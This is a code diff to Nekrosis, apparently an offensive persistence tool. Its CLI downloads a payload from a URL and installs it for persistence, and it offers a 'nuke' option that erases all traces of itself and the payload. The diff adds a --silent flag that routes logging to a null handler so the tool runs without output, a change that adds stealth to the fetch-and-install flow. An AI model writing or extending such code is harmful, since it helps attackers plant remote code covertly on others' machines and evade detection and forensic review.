@@ -54,12 +54,12 @@ class Nekrosis:
         - nuke()
     """
 
-    def __init__(self, payload: str, custom_method: str = None, nuke: bool = False) -> None:
+    def __init__(self, payload: str, custom_method: str = None, nuke: bool = False, silent: bool = False) -> None:
         self._payload       = payload
         self._custom_method = custom_method
         self._nuke          = nuke
 
-        self._init_logging()
+        self._init_logging(silent)
 
         self.persistence_obj: Persistence = None
 
@@ -92,7 +92,7 @@ class Nekrosis:
         )
 
 
-    def _init_logging(self, verbose: bool = False) -> None:
+    def _init_logging(self, verbose: bool = False, silent: bool = False) -> None:
         """
         Initialize logging.
         """
@@ -103,10 +103,9 @@ class Nekrosis:
             level=logging.INFO,
             format="%(message)s" if verbose is False else "[%(levelname)-8s] [%(filename)-20s]: %(message)s",
             handlers=[
-                logging.StreamHandler()
+                logging.StreamHandler() if silent is False else logging.NullHandler()
             ]
         )
-
 
     def _verify_payload(self) -> None:
         """
@@ -305,19 +304,27 @@ def main():
         "-n",
         "--nuke",
         action="store_true",
-        help="Remove all traces of Nekrosis and the original payload."
+        help="Remove all traces of Nekrosis and the original payload.",
+        default=False
+    )
+    parser.add_argument(
+        "-s",
+        "--silent",
+        action="store_true",
+        help="Silence all output.",
+        default=False
     )
 
     args = parser.parse_args()
 
     if args.payload:
             if args.payload.startswith("http://") or args.payload.startswith("https://"):
-                nekrosis = Nekrosis(payload=args.payload, custom_method=args.method, nuke=args.nuke if args.nuke else False)
+                nekrosis = Nekrosis(payload=args.payload, custom_method=args.method, nuke=args.nuke, silent=args.silent)
                 if nekrosis.download_payload(args.payload):
                     nekrosis.change_payload("download")
                     nekrosis.install()
             else:
-                nekrosis = Nekrosis(payload=args.payload, custom_method=args.method, nuke=args.nuke if args.nuke else False)
+                nekrosis = Nekrosis(payload=args.payload, custom_method=args.method, nuke=args.nuke, silent=args.silent)
 
                 if args.list_supported_methods or args.export:
                     if args.export:
